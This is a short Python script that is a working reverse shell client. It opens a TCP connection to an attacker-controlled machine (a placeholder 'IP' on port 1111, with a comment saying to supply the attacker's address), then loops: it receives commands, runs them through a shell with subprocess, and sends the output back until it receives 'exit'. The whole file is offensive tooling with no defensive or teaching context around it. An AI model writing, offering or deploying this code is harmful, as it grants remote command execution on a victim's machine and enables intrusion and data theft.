from re import sub
import socket
import subprocess

soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#provide your attacker machine (server) IP address and listening port
soc.connect(('IP',1111))

while True:
    command = soc.recv(4096).decode('UTF-8')
    #print ("Command recivied: " + command)
    if command == 'exit':
        soc.close()
        break
    else:
        CMD = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        soc.send(CMD.stdout)